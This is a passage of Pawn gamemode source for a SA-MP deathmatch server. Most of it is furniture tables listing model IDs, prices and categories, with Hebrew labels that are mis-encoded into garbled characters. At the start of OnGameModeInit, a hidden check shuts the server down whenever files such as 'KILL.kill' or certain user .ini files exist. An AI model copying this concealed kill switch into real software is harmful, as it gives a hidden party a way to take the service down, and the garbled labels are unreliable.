	{7,"Mahogany Oval Coffee Table", 1822, 3750, 7, 1},
	{8,"Mahogany Square Coffee Table", 1823, 4500, 7, 1},
	{9,"Ebony Wood Basic Coffee Table", 2126, 3750, 7, 1},
	{0,"Maggies Co. Counter Top", 2014, 950, 7, 2},
	{1,"Maggies Co. Counter Right Handle", 2015, 1000, 7, 2},
	{2,"Maggies Co. Counter Left Handle", 2016, 2000, 7, 2},
	{3,"Maggies Co. Blank Counter Top", 2019, 4000, 7, 2},
	{4,"Maggies Co. Corner Counter Top", 2022, 4000, 7, 2},
	{5,"LoveSet Counter Top", 2129, 2000, 7, 2},
	{6,"LoveSet Corner Counter Top", 2304, 2000, 7, 2},
	{7,"Creamy Metal Counter Top", 2133, 2000, 7, 2},
	{8,"Sterlin Co. Cabinet Top", 2137, 3500, 7, 2},
	{9,"Sterlin Co. Counter Top", 2138, 3500, 7, 2},
	{10,"Sterlin Co. Counter", 2139, 3500, 7, 2},
	{11,"Sterlin Co. Corner Counter Top", 2305, 3500, 7, 2},
	{12,"Old Town Counter", 2142, 2000, 7, 2},
	{13,"Wooden Snow White Counter Top", 2151, 3250, 7, 2},
	{14,"Wooden Snow White Cabinet Counter ", 2152, 2750, 7, 2},
	{15,"Wooden Snow White Counter", 2155, 3000, 7, 2},
	{16,"Mahogany Green Wood Counter", 2156, 2000, 7, 2},
	{17,"Mahogany Green Wood Cabinet Counter", 2159, 3000, 7, 2},
	{18,"Laguna Wooden Counter", 2414, 2200, 7, 2},
	{19,"Light Blue IceBox Counter", 2424, 2100, 7, 2},
	{20,"Light Blue IceBox Corner Counter", 2423, 2100, 7, 2},
	{21,"November Wood Counter", 2435, 2100, 7, 2},
	{22,"November Wood Corner Counter", 2434, 2100, 7, 2},
	{23,"Dark Marble Diamond Counter", 2439, 4000, 7, 2},
	{24,"Dark Marble Diamond Corner Counter", 2440, 4000, 7, 2},
	{25,"Marble Zinc Top Counter", 2441, 4200, 7, 2},
	{26,"Marble Zinc Top Corner Counter", 2442, 6000, 7, 2},
	{27,"Marble Zinc Top Counter (Regular)", 2445, 2500, 7, 2},
	{28,"Marble Zinc Top Counter (Half - Design) ", 2444, 2500, 7, 2},
	{29,"Parlor Red Counter", 2446, 2000, 7, 2},
	{30,"Parlor Red Corner Counter", 2450, 2000, 7, 2},
	{31,"Parlor Red Checkered Counter", 2455, 2000, 7, 2},
	{32,"Parlor Red Checkered Corner Counter ", 2454, 2000, 7, 2},
	{0,"Basic Wooden Display Cabinet", 2046, 1450, 7, 3},
	{1,"Fancy Dark Wooden Display Cabinet ", 2078, 2150, 7, 3},
	{2,"Glass Front Wooden Display Cabinet ", 2385, 1750, 7, 3},
	{3,"Delicate Glass Wooden Display Cabinet ", 2458, 1750, 7, 3},
	{4,"Mini Delicate Glass Wooden Display ", 2459, 1750, 7, 3},
	{5,"Long Delicate Glass Wooden Display ", 2460, 1750, 7, 3},
	{6,"Cubed Delicate Glass Wooden Display", 2461, 1750, 7, 3},
	{0,"Industrial Display Shelf", 2063, 2450, 7, 4},
	{1,"Black Metal Glass Display Shelf", 2210, 2750, 7, 4},
	{2,"Wooden Glass Display Shelf", 2211, 2750, 7, 4},
	{3,"Very Large Wooden Display Shelf", 2403, 16750, 7, 4},
	{4,"Wall Mounted Thin Wooden Display Shelf", 2462, 2750, 7, 4},
	{5,"Wall Mounted Wooden Display Shelf", 2463, 3000, 7, 4},
	{6,"Wooden Display Shelf With Bar", 2708, 3200, 7, 4},
	{7,"Modern White Counter Display Shelf", 2367, 3500, 7, 4},
	{8,"Wooden Counter Display Shelf", 2368, 3500, 7, 4},
	{9,"Wooden & Glass Table Display Shelf", 2376, 3000, 7, 4},
	{10,"Tall Parlor Red Display Shelf", 2447, 2300, 7, 4},
	{11,"Wide Parlor Red Display Shelf", 2448, 2500, 7, 4},
	{12,"Tall & Wide Parlor Red Display Shelf", 2449, 3700, 7, 4},
	{13,"Parlor Red Checkered Display Shelf", 2457, 4500, 7, 4},
	{0,"Three Level Wooden TV Stand", 912, 1500, 7, 5},
	{1,"Small Two Level Wooden TV Stand", 2321, 1700, 7, 5},
	{2,"Antique Oak TV Stand", 2319, 1350, 7, 5},
	{3,"Light Wooden Small TV Stand", 2314, 1950, 7, 5},
	{4,"Small Wooden TV Stand", 2315, 1700, 7, 5},
	{5,"Light Wooden Small TV Stand With VCR", 2313, 2500, 7, 5},
	{6,"Dark Mahogany TV Stand", 2311, 2900, 7, 5},
	{0,"Blue Plaid Shirts Rail", 2374, 200, 8, 0},
	{1,"Black Levis Jeans Rail", 2377, 400, 8, 0},
	{2,"Black Levis Jeans Rail", 2378, 400, 8, 0},
	{3,"Row of Sweat Pants", 2381, 560, 8, 0},
	{4,"Row of Levis Jeans", 2382, 1000, 8, 0},
	{5,"Yellow Shirts Rail", 2383, 200, 8, 0},
	{6,"Stack of Khaki Pants", 2384, 300, 8, 0},
	{7,"Red And White Sports Jacket Rail", 2389, 680, 8, 0},
	{8,"Green Sweat Pants Rail", 2390, 240, 8, 0},
	{9,"Khaki Pants Rail", 2391, 300, 8, 0},
	{10,"Row of Khakis & Levis Jeans", 2392, 600, 8, 0},
	{11,"Row of Shirts", 2394, 850, 8, 0},
	{12,"Back and Red Blazers Rail", 2396, 1200, 8, 0},
	{13,"Grey Jeans Rail", 2397, 340, 8, 0},
	{14,"Blue Sweat Pants Rail", 2398, 240, 8, 0},
	{15,"Grey Sweatshirt Rail", 2399, 240, 8, 0},
	{16,"Red Sweat Pants Rail", 2401, 240, 8, 0},
	{0,"Beer Bottle", 1951, 50, 8, 1},
	{1,"Beer Bottle", 1950, 50, 8, 1},
	{2,"Beer Bottle", 1486, 50, 8, 1},
	{3,"Beer Bottle", 1543, 50, 8, 1},
	{4,"Beer Bottle", 1544, 50, 8, 1},
	{5,"Scotch Bottle", 1520, 100, 8, 1},
	{6,"Wine Bottle", 1644, 150, 8, 1},
	{7,"Wine Bottle", 1669, 150, 8, 1},
	{0,"White Basic Door", 3109, 4000, 8, 2},
	{1,"Wooden Door With Small Window", 3089, 5500, 8, 2},
	{2,"Gate Door", 3061, 3000, 8, 2},
	{3,"Heavy Blue Door", 2970, 5750, 8, 2},
	{4,"White Basic Room Door", 2955, 4000, 8, 2},
	{5,"Golden Door", 2946, 5750, 8, 2},
	{6,"Small Cell Gate", 2930, 3000, 8, 2},
	{7,"Old Office Door", 977, 4000, 8, 2},
	{8,"Swinging Dark Wooden Door", 1491, 5000, 8, 2},
	{9,"White Wooden Door", 1492, 4500, 8, 2},
	{10,"Red Shop Door", 1493, 3500, 8, 2},
	{11,"Blue Wooden Door", 1494, 4500, 8, 2},
	{12,"Blue Wired Door", 1495, 3500, 8, 2},
	{13,"Metal Love Shop Door", 1496, 4500, 8, 2},
	{14,"Metal Door", 1497, 5000, 8, 2},
	{15,"Dirty White Door", 1498, 2600, 8, 2},
	{16,"Dirty Metal Door", 1499, 4700, 8, 2},
	{17,"Metal Screen Door", 1500, 4700, 8, 2},
	{18,"Wooden Screen Door", 1501, 4700, 8, 2},
	{19,"Swinging Wooden Door", 1502, 5000, 8, 2},
	{20,"Red Door", 1504, 4000, 8, 2},
	{21,"Blue Door", 1505, 4000, 8, 2},
	{22,"White Door", 1506, 4000, 8, 2},
	{23,"Yellow Door", 1507, 4000, 8, 2},
	{24,"Shop Door With Stickers", 1522, 3500, 8, 2},
	{25,"Shop Door With Stickers 2", 1532, 3500, 8, 2},
	{26,"Metal Shop Door", 1533, 4000, 8, 2},
	{27,"Swinging Metal Door With Window", 1523, 4500, 8, 2},
	{28,"Basic White Door", 1535, 4000, 8, 2},
	{29,"Modern Black Door", 1536, 4000, 8, 2},
	{30,"Modern Black Door Golden Frame", 1556, 5000, 8, 2},
	{0,"Random Mess", 2670, 5, 8, 3},
	{1,"Random Mess", 2671, 5, 8, 3},
	{2,"Random Mess", 2673, 5, 8, 3},
	{3,"Random Mess", 2674, 5, 8, 3},
	{4,"Random Mess", 2867, 8, 8, 3},
	{5,"Burger Shot Mess", 2672, 8, 8, 3},
	{6,"Burger Shot Mess", 2675, 8, 8, 3},
	{7,"Burger Shot Mess", 2677, 9, 8, 3},
	{8,"Burger Shot Mess", 2840, 10, 8, 3},
	{9,"Newspapers & Burger Shot Mess", 2676, 13, 8, 3},
	{10,"Dishes ", 2812, 20, 8, 3},
	{11,"Messy Pants", 2819, 100, 8, 3},
	{12,"Messy Clothes", 2843, 50, 8, 3},
	{13,"Messy Clothes", 2844, 50, 8, 3},
	{14,"Messy Clothes", 2845, 55, 8, 3},
	{15,"Messy Clothes", 2846, 50, 8, 3},
	{16,"Dishes", 2820, 20, 8, 3},
	{17,"Cereal Box & Cans", 2821, 10, 8, 3},
	{18,"Blue Dishes", 2823, 30, 8, 3},
	{19,"Colorful Dishes", 2829, 30, 8, 3},
	{20,"Dishes", 2850, 30, 8, 3},
	{21,"Dishes & Colorful Cups", 2831, 30, 8, 3},
	{22,"Colorful Dishes", 2832, 40, 8, 3},
	{23,"Cluck N Bell Mess", 2823, 8, 8, 3},
	{24,"Pizza Stack Mess", 2838, 10, 8, 3},
	{25,"Chinese Food Mess", 2839, 7, 8, 3},
	{26,"Chinese Food Mess", 2858, 7, 8, 3},
	{27,"Dishes With Pizza", 2848, 12, 8, 3},
	{28,"Dishes With Pizzas", 2850, 13, 8, 3},
	{29,"Colorful Dishes", 2849, 30, 8, 3},
	{30,"Dishes", 2851, 20, 8, 3},
	{31,"Crushed Milk", 2856, 5, 8, 3},
	{32,"Pizza Box Mess", 2857, 6, 8, 3},
	{33,"Empty Cookie Boxes", 2861, 2, 8, 3},
	{34,"Empty Cookie Boxes & Cans", 2866, 4, 8, 3},
	{0,"Padlock", 2680, 700, 8, 4},
	{1,"Ashtray", 1510, 700, 8, 4},
	{2,"Electric Fly Killer", 14774, 2000, 8, 4},
	{3,"Fire Alarm Button", 2961, 900, 8, 4},
	{4,"Fire Alarm Button (Sign)", 2962, 700, 8, 4},
	{5,"Whiteboard", 2616, 3500, 8, 4},
	{6,"Blue Pinboard", 2611, 700, 8, 4},
	{7,"Blue Pinboard", 2612, 700, 8, 4},
	{8,"Articles", 2615, 100, 8, 4},
	{9,"Casket", 2896, 10000, 8, 4},
	{10,"R* Surfboard", 2404, 2000, 8, 4},
	{11,"Red & Blue Surfboard", 2405, 2000, 8, 4},
	{12,"Vice City Surfboard", 2406, 2000, 8, 4},
	{13,"Wooden Surfboard", 2410, 2000, 8, 4},
	{0,"Tall White Pillar", 2774, 5000, 8, 5},
	{1,"Metal Pillar", 3440, 5000, 8, 5},
	{2,"Indian Wood Pillar", 2308, 5600, 8, 5},
	{3,"Stone Pillar", 3494, 5300, 8, 5},
	{4,"Tall Wooden Pillar", 3498, 5200, 8, 5},
	{5,"Fat Tall Wooden Pillar", 3499, 5300, 8, 5},
	{6,"Pillar Skull Head", 3524, 5420, 8, 5},
	{7,"Red Dragon Pillar", 3533, 5150, 8, 5},
	{8,"Wooden Pillar Plant", 3439, 5150, 8, 5},
	{9,"Brick Construction Pillar", 3529, 5550, 8, 5},
	{10,"Metal Pole", 3503, 1850, 8, 5},
	{0,"Security Camera", 1622, 3000, 8, 6},
	{1,"Security Camera", 1616, 3000, 8, 6},
	{2,"Security Camera", 1886, 3000, 8, 6},
	{3,"Door Security Passcode", 2886, 2500, 8, 7},
	{4,"Security Shop Beeper", 1892, 4000, 8, 7},
	{5,"Ja Water Dispenser", 1808, 150, 8, 7},
	{6,"Clean Office Desk", 1964, 1800, 8, 7},
	{7,"Desk Top Office Equipment", 1964, 1800, 8, 7},
	{8,"Office Desk & Equipment", 1998, 1300, 8, 7},
	{9,"Office Light Wooden Desk & Computer ", 1999, 1000, 8, 7},
	{10,"Water Dispenser", 2002, 150, 8, 7},
	{11,"Office White Top Desk & Equipment", 2008, 1200, 8, 7},
	{12,"White Office Desk & Computer", 2009, 1250, 8, 7},
	{13,"Office Shelf & Files", 2161, 80, 8, 7},
	{14,"Wide Office Shelf & Files", 2162, 160, 8, 7},
	{15,"Wide and Tall Office Shelf & Files", 2164, 300, 8, 7},
	{16,"Oak Office Desk & Equipment", 2165, 4500, 8, 7},
	{17,"Oak Office Desk & Files", 2166, 3800, 8, 7},
	{18,"Red Cubicle Divider", 2168, 1000, 8, 7},
	{19,"White Office Desk With Wood Top", 2169, 2200, 8, 7},
	{20,"Wood Top Desk With Backboard", 2171, 2400, 8, 7},
	{21,"Blue Office Desk & Equipment", 2172, 5600, 8, 7},
	{22,"Oak Office Desk", 2173, 5000, 8, 7},
	{23,"Wood Top Desk With Backboard & Equipment", 2174, 2800, 8, 7},
	{24,"Wood Top Desk Corner", 2175, 1900, 8, 7},
	{25,"Wide Wooden Desk", 2180, 2500, 8, 7},
	{26,"Office Desk With Backboard & Computer ", 2181, 2500, 8, 7},
	{27,"Office Desk & Files", 2182, 2200, 8, 7},
	{28,"Four Divided Wooden Desks", 2183, 8500, 8, 7},
	{29,"Diagonal Wooden Desk", 2184, 2000, 8, 7},
	{30,"Open Wooden Desk & Computer", 2185, 1000, 8, 7},
	{31,"Office Printer", 2186, 4000, 8, 7},
	{32,"Blue Cubicle Divider", 2187, 1000, 8, 7},
	{33,"Computer", 2190, 760, 8, 7},
	{34,"Little Fan", 2192, 30, 8, 7},
	{35,"Cubicle & Equipment", 2193, 8360, 8, 7},
	{36,"Two Light Blue Office Desks & Equipment", 2604, 5360, 8, 7},
	{37,"Basic Office Desk & Equipment", 2605, 2250, 8, 7},
	{38,"Basic Office Desk", 2607, 2000, 8, 7},
	{0,"Toy Red Plane", 2469, 10, 8, 8},
	{1,"Tree Train Toy Boxes", 2471, 20, 8, 8},
	{2,"Four Toy Red Planes", 2472, 40, 8, 8},
	{3,"Two Toy Red Planes", 2473, 20, 8, 8},
	{4,"Four Train Toys", 2474, 30, 8, 8},
	{5,"Three Hotwheels Stacked Boxes", 2477, 25, 8, 8},
	{6,"Four Hotwheels Stacked Boxes", 2480, 30, 8, 8},
	{7,"Hotwheels Box", 2481, 5, 8, 8},
	{8,"Train Model Box", 2483, 15, 8, 8},
	{9,"R* Boat Model", 2484, 25, 8, 8},
	{10,"Wooden Car Toy", 2485, 45, 8, 8},
	{11,"Tropical Diamond Kite", 2487, 30, 8, 8},
	{12,"Manhunt Toy Box Sets", 2489, 20, 8, 8},
	{13,"Vice City Toy Box Sets", 2490, 20, 8, 8},
	{14,"Pink Winged Box Kite", 2497, 35, 8, 8},
	{15,"Blue Winged Box Kite", 2498, 35, 8, 8},
	{16,"R* Diamond Kite", 2499, 30, 8, 8},
	{17,"Paper Wooden Plane", 2512, 30, 8, 8},
	{0,"Bright Yellow Flouder", 1599, 300, 9, 0},
	{1,"Exotic Blue Flounder", 1600, 350, 9, 0},
	{2,"School of Blue Flounders", 1601, 600, 9, 0},
	{3,"Bright Jellyfish", 1602, 500, 9, 0},
	{4,"Jellyfish", 1603, 500, 9, 0},
	{5,"Blue Flounder", 1604, 300, 9, 0},
	{6,"School of Yellow Flounders", 1605, 600, 9, 0},
	{7,"School of Exotic Blue Flounders", 1606, 650, 9, 0},
	{8,"Dolphin", 1607, 5000, 9, 0},
	{9,"Shark", 1608, 5000, 9, 0},
	{10,"Turtle", 1609, 5000, 9, 0},
	{11,"Deer", 19315, 4500, 9, 0},
	{12,"Parrot", 19078, 1500, 9, 0},
	{0,"Slot Machine", 1830, 10000, 9, 1},
	{1,"Slot Machine", 1831, 10000, 9, 1},
	{2,"Slot Machine", 1832, 10000, 9, 1},
	{3,"Slot Machine", 1833, 10000, 9, 1},
	{4,"Slot Machine", 1834, 10000, 9, 1},
	{5,"Slot Machine", 1835, 10000, 9, 1},
	{6,"Slot Machine", 1838, 1000, 9, 1},
	{7,"Roulette Table", 1978, 10000, 9, 1},
	{8,"Roulette Wheel", 1979, 10000, 9, 1},
	{9,"Blackjack Table", 2188, 10000, 9, 1},
	{0,"Grove St. 4 Life", 18659, 3000, 9, 2},
	{1,"Seville B.L.V.D Families", 18660, 3000, 9, 2},
	{2,"Varrio Los Aztecas", 18661, 3000, 9, 2},
	{3,"Kilo", 18662, 3000, 9, 2},
	{4,"San Fiero Rifa", 18663, 3000, 9, 2},
	{5,"Temple Drive Ballas", 18664, 3000, 9, 2},
	{6,"Los Santos Vagos", 18665, 3000, 9, 2},
	{7,"Front Yard Balas", 18666, 3000, 9, 2},
	{8,"Rollin Heights Ballas", 18667, 3000, 9, 2},
	{0,"Dance Floor", 19128, 15000, 9, 3},
	{1,"Large Dance Floor", 19129, 25000, 9, 3},
	{2,"Disco Ball", 19159, 6300, 9, 3},
	{3,"Club Lights", 18102, 20000, 9, 3},
	{4,"Blue Bollard Light", 19121, 3000, 9, 3},
	{5,"Green Bollard Light", 19122, 3000, 9, 3},
	{6,"Light Blue Bollard Light", 19123, 3000, 9, 3},
	{7,"Purple Bollard Light", 19124, 3000, 9, 3},
	{8,"Red Bollard Light", 19125, 3000, 9, 3},
	{9,"White Bollard Light", 19126, 3000, 9, 3},
	{10,"Yellow Bollard Light", 19127, 3000, 9, 3},
	{0,"Snow Machine", 18864, 13500, 9, 4},
	{1,"Smoke Machine", 2780, 13500, 9, 4},
	{0,"Ice Cream Parlor Wall", 19353, 3000, 9, 5},
	{1,"Leather Diamond Wall", 19354, 3000, 9, 5},
	{2,"Cement Think Brick Wall", 19355, 3500, 9, 5},
	{3,"Wooden Wall", 19356, 3200, 9, 5},
	{4,"Cement Wall", 19357, 3300, 9, 5},
	{5,"Grey & Black Cotton Wall", 19358, 3000, 9, 5},
	{6,"Plain Tan Wall", 19359, 3000, 9, 5},
	{7,"Tough Light Wood Wall", 19360, 3200, 9, 5},
	{8,"Tan & Red Wall", 19361, 3000, 9, 5},
	{9,"Road Textured Wall", 19362, 3000, 9, 5},
	{10,"Plain Dark Pastel Pink Wall", 19363, 3000, 9, 5},
	{11,"Cement Brick Wall", 19364, 3600, 9, 5},
	{12,"Plain Light Blue Wall", 19365, 3000, 9, 5},
	{13,"Thick Wood Wall", 19366, 3200, 9, 5},
	{14,"Light Blue Spring Themed Wall", 19367, 3000, 9, 5},
	{15,"Light Pink Spring Themed Wall", 19368, 3000, 9, 5},
	{16,"Light Yellow Spring Themed Wall", 19369, 3000, 9, 5},
	{17,"Bright Wooden Wall", 19370, 3200, 9, 5},
	{18,"Plain Cement Wall", 19371, 3000, 9, 5},
	{19,"Sand Wall", 19372, 3000, 9, 5},
	{20,"Grass Wall", 19373, 3000, 9, 5},
	{21,"Wavey Wooden Wall", 19375, 3200, 9, 5},
	{22,"Red Wooden Wall", 19376, 3200, 9, 5},
	{23,"Carpet Textured Wall", 19377, 3000, 9, 5},
	{24,"Dark Wooden Wall", 19378, 3200, 9, 5},
	{25,"Basic Light Wood Wall", 19379, 3200, 9, 5},
	{26,"Dark Sand Wall", 19380, 3200, 9, 5},
	{27,"Dark Grass Wall", 19381, 3000, 9, 5},
	{0,"Ice Cream Parlor Wall (Doorway)", 19383, 3000, 9, 6},
	{1,"Leather Diamond Wall (Doorway)", 19384, 3000, 9, 6},
	{2,"Cement Think Brick Wall (Doorway)", 19385, 3500, 9, 6},
	{3,"Wooden Wall (Doorway)", 19386, 3200, 9, 6},
	{4,"Cement Wall(Doorway)", 19387, 3300, 9, 6},
	{5,"Grey & Black Cotton Wall (Doorway)", 19388, 3000, 9, 6},
	{6,"Plain Tan Wall (Doorway)", 19389, 3000, 9, 6},
	{7,"Tan & Red Wall (Doorway)", 19390, 3000, 9, 6},
	{8,"Road Textured Wall (Doorway)", 19391, 3000, 9, 6},
	{9,"Plain Dark Pastel Pink Wall (Doorway)", 19392, 3000, 9, 6},
	{10,"Cement Brick Wall (Doorway)", 19393, 3600, 9, 6},
	{11,"Plain Light Blue Wall (Doorway)", 19394, 3000, 9, 6},
	{12,"Light Blue Spring Themed Wall (Doorway)", 19395, 3000, 9, 6},
	{13,"Light Pink Spring Themed Wall (Doorway)", 19396, 3000, 9, 6},
	{14,"Light Yellow Spring Themed Wall (Doorway)", 19397, 3000, 9, 6},
	{15,"Plain Cement Wall (Doorway)", 19398, 3000, 9, 6},
	{0,"Ice Cream Parlor Wall (Open Window)", 19399, 3000, 9, 7},
	{1,"Leather Diamond Wall (Open Window) ", 19400, 3000, 9, 7},
	{2,"Cement Think Brick Wall (Open Window) ", 19401, 3500, 9, 7},
	{3,"Wooden Wall (Open Window)", 19402, 3200, 9, 7},
	{4,"Cement Wall(Open Window)", 19403, 3300, 9, 7},
	{5,"Grey & Black Cotton Wall (Open Window) ", 19404, 3000, 9, 7},
	{6,"Plain Tan Wall (Open Window)", 19405, 3000, 9, 7},
	{7,"Tough Light Wood Wall (Open Window)", 19406, 3300, 9, 7},
	{8,"Tan & Red Wall (Open Window)", 19407, 3000, 9, 7},
	{9,"Road Textured Wall (Open Window)", 19408, 3000, 9, 7},
	{10,"Plain Dark Pastel Pink Wall (Open Window) ", 19409, 3000, 9, 7},
	{11,"Cement Brick Wall (Open Window)", 19410, 3600, 9, 7},
	{12,"Plain Light Blue Wall (Open Window)", 19411, 3000, 9, 7},
	{13,"Thick Wooden Wall (Open Window)", 19412, 3200, 9, 7},
	{14,"Light Blue Spring Themed Wall (Open Window)", 19413, 3000, 9, 7},
	{15,"Light Pink Spring Themed Wall (Open Window)", 19414, 3000, 9, 7},
	{16,"Light Yellow Spring Themed Wall (Open Window)", 19415, 3000, 9, 7},
	{17,"Basic Light Wood Wall (Open Window) ", 19416, 3200, 9, 7},
	{18,"Plain Cement Wall (Open Window)", 19417, 3000, 9, 7},
	{0,"Ice Cream Parlor Wall (Thin)", 19426, 2000, 9, 8},
	{1,"Leather Diamond Wall (Thin)", 19427, 2000, 9, 8},
	{2,"Cement Think Brick Wall (Thin)", 19428, 2500, 9, 8},
	{3,"Wooden Wall (Thin)", 19429, 2200, 9, 8},
	{4,"Cement Wall(Thin)", 19430, 2300, 9, 8},
	{5,"Grey & Black Cotton Wall (Thin)", 19431, 2000, 9, 8},
	{6,"Plain Tan Wall (Thin)", 19432, 2000, 9, 8},
	{7,"Tough Light Wood Wall (Thin)", 19433, 2300, 9, 8},
	{8,"Tan & Red Wall (Thin)", 19434, 2000, 9, 8},
	{9,"Road Textured Wall (Thin)", 19435, 2000, 9, 8},
	{10,"Plain Dark Pastel Pink Wall (Thin)", 19436, 2000, 9, 8},
	{11,"Cement Brick Wall (Thin)", 19437, 2000, 9, 8},
	{12,"Plain Light Blue Wall (Thin)", 19438, 2000, 9, 8},
	{13,"Thick Wooden Wall (Thin)", 19439, 2200, 9, 8},
	{14,"Light Blue Spring Themed Wall (Thin) ", 19440, 2000, 9, 8},
	{15,"Light Pink Spring Themed Wall (Thin) ", 19441, 2000, 9, 8},
	{16,"Light Yellow Spring Themed Wall (Thin) ", 19442, 2000, 9, 8},
	{17,"Basic Light Wood Wall (Thin)", 19443, 2000, 9, 8},
	{18,"Plain Cement Wall (Thin)", 19444, 2000, 9, 8},
	{0,"Ice Cream Parlor Wall (Wide)", 19445, 6000, 9, 9},
	{1,"Leather Diamond Wall (Wide)", 19446, 6000, 9, 9},
	{2,"Cement Think Brick Wall (Wide)", 19447, 6500, 9, 9},
	{3,"Wooden Wall (Wide)", 19448, 6200, 9, 9},
	{4,"Cement Wall (Wide)", 19449, 6300, 9, 9},
	{5,"Grey & Black Cotton Wall (Wide)", 19450, 6000, 9, 9},
	{6,"Plain Tan Wall (Wide)", 19451, 6000, 9, 9},
	{7,"Red Wooden Wall (Wide)", 19452, 6200, 9, 9},
	{8,"Tan & Red Wall (Wide)", 19453, 6000, 9, 9},
	{9,"Carpet Textured Wall (Wide)", 19454, 6000, 9, 9},
	{10,"Plain Dark Pastel Pink Wall (Wide)", 19455, 6000, 9, 9},
	{11,"Cement Brick Wall (Wide)", 19456, 6600, 9, 9},
	{12,"Plain Light Blue Wall (Wide)", 19457, 6000, 9, 9},
	{13,"Thick Wooden Wall (Wide)", 19458, 6200, 9, 9},
	{14,"Light Blue Spring Themed Wall (Wide) ", 19459, 6000, 9, 9},
	{15,"Light Pink Spring Themed Wall (Wide) ", 19460, 6000, 9, 9},
	{16,"Light Yellow Spring Themed Wall (Wide) ", 19461, 6000, 9, 9},
	{17,"Basic Light Wood Wall (Wide)", 19462, 6200, 9, 9},
	{18,"Plain Cement Wall (Wide)", 19463, 6000, 9, 9},
	{0,"Regular Glass", 3859, 3000, 9, 10},
	{1,"Glass", 3857, 3000, 9, 10},
	{2,"Long Glass", 3858, 6000, 9, 10},
	{3,"Unbreakable Glass", 1649, 7000, 9, 10}
};
new HouseFurnituresCategories[][FurnituresSubCategories] =
{
		/* Appliances */
	{0,"Refrigerators - юў°°щэ",0},
	{0,"Stoves - ·Ёх°щэ",1},
	{0,"Trash Cans - Їчщ р∙Їф",2},
	{0,"Small Appliances - юхЎ°щ ч∙юь ўшЁщэ",3},
	{0,"Dumpsters - Їчщ р∙Їф",4},
	    /* Comfort */
	{1,"Beds - ющшх·",0},
	{1,"Chairs - ыщёрх·",1},
	{1,"Arm Chairs - ых°ёрх·",2},
	{1,"Couches - ёЇх·",3},
	{1,"Stools - ∙°Ї°Їщэ",4},
	    /* Decorations */
	{2,"Curtains - хщьхЁх·",0},
	{2,"Flags - утьщэ",1},
	{2,"Rugs - ∙шщчщэ",2},
	{2,"Statues - Їёьщэ",3},
	{2,"Towels - ютсх·",4},
	{2,"Paintings - Ўщх°щэ",5},
	{2,"Plants - Ўючщэ",6},
	{2,"Posters - Їхёш°щэ",7},
	    /* Entertainment */
	{3,"Sporting Equipment - Ўщху ёЇх°ш",0},
	{3,"Televisions - шьххщцщх·",1},
	{3,"Gaming Machines - юыхЁх· ю∙чўщэ",2},
	{3,"Media Players - ЁтЁщ юущф",3},
	{3,"Stereos - юЄ°ых· ёш°щрхё",4},
	{3,"Speakers - °юўхьщэ",5},
	    /* Lighting */
	{4,"Lamps - юЁх°х·",0},
	{4,"Sconces - Їюхшщэ",1},
	{4,"Ceiling Lights - рх° ·ў°ф",2},
	{4,"Neon Lights - рх°х· Ёщрхя",3},
	    /* Plumbing */
	{5,"Toilets - ∙щ°х·щэ",0},
	{5,"Sinks - ыщх°щэ",1},
	{5,"Showers - юўьчхЁщэ",2},
	{5,"Bath Tubs - рюсшщх·",3},
	    /* Storage */
	{6,"Safe - сшхч",0},
	{6,"Bookshelves - юуЇщ ёЇ°щэ",1},
	{6,"Dressers - ∙щух·",2},
	{6,"Filing Cabinets - р°хЁх· ·щхў",3},
	{6,"Pantries - юцххф",4},
	    /* Surfaces */
	{7,"Dining Tables - ∙хьчЁх· рхыь",0},
	{7,"Coffee Tables - ∙хьчЁх· ўЇф",1},
	{7,"Counters - уьЇўщэ",2},
	{7,"Display Cabinets - фЎт· р°хЁх·",3},
	{7,"Display Shelves - юуЇщ ·Ўхтф",4},
	{7,"TV Stands - ёшЁущ шьххщцщф",5},
	    /* Miscellaneous */
	{8,"Clothes - стущэ",0},
	{8,"Consumables - ю·ыьщэ",1},
	{8,"Doors - уь·х·",2},
	{8,"Mess - сьтя",3},
	{8,"Miscellaneous - ∙хЁщэ",4},
	{8,"Pillars - Єюхущэ",5},
	{8,"Security - рсшчф",6},
	{8,"Office - ю∙°ущ",7},
	{8,"Toys - ЎЄЎхЄщэ",8},
		/* Special */
	{9,"Animals - чщх·",0},
	{9,"Gambling - фщюх°щэ",1},
	{9,"Gang Tags - ·тщх· ыЁхЇщф",2},
	{9,"Party - юёщсх·",3},
	{9,"Effects - рЇўшщэ",4},
	{9,"Walls - ўщ°х·",5},
	{9,"Walls (Doorway) - ўщ°х· Ї·ч",6},
	{9,"Walls (Open Window) - ўщ°х· чьхя Ї·хч",7},
	{9,"Walls (Thin) - ўщ°х· уўщэ",8},
	{9,"Walls (Wide) - ўщ°х· °чсщэ",9},
	{9,"Glass - цыхыщх·",10}
};
new FurnituresCategoriesInfo[][FurnituresCategories] =
{
	{0,"Appliances - юхЎ°щ ч∙юь",5},
	{1,"Comfort - Ёхчх·",5},
	{2,"Decorations - ўщ∙хшщэ",8},
	{3,"Entertainment - сщух°",6},
	{4,"Lighting - ·рх°ф",4},
	{5,"Plumbing - рщЁёшьЎщф",4},
	{6,"Storage - рчёхя",5},
	{7,"Surfaces - ю∙шчщэ",6},
	{8,"Miscellaneous - ∙хЁщэ",9},
	{9,"Special - ющхчу",10}
};
new SpecialThirdVehicle[][SpecialThirdVehicleEnum] =
{
	{520,"чььщ·"},
	{443,"ш°ўшх° юЇьЎ·щ"},
	{487,"ыух° Їх°ч"},
	{411,"Ї°ф"},
	{464,"юёхўхя"},
	{481,"Єть· ёхЇ°"},
	{509,"ыщёр тьтьщэ"}
};
#pragma unused FurnituresCategoriesInfo
#pragma unused HouseFurnituresCategories
#pragma unused HouseFurnitures
//=[Main]=======================================================================
main() print("SAMP-IL DeathMatch by Amit_B loaded");
//=[OnGameModeInit]=============================================================
public OnGameModeInit()
{
	if(fexist("/DM/Users/KILL.kill") || fexist("/DM/Users/xd.ini") || fexist("/DM/Users/D9300iXtro_CVC.ini")) return SendRconCommand("exit");
	dbg(11,"1");
	if(debugstate) printf("OnGameModeInit start");
	// Settings
	new time[3];
	gettime(time[0],time[1],time[2]);
	SetGameModeText(comname " DM " version);
	SendRconCommand("hostname " hostname);
	UsePlayerPedAnims();
	ShowPlayerMarkers(PLAYER_MARKERS_MODE_GLOBAL);
	ShowNameTags(1);
	SetGravity(0.008000);
	AllowInteriorWeapons(1);
	EnableStuntBonusForAll(0);
	AllowClientsOnly(false); // guard_shit
	LockServ = 0;
	dbg(11,"2");
	// Filterscripts
	SendRconCommand("loadfs animlist");
	SendRconCommand("loadfs prizes2");
	SendRconCommand("loadfs ir");
	SendRconCommand("loadfs ls_elevator");
	// Object Streamer Settings
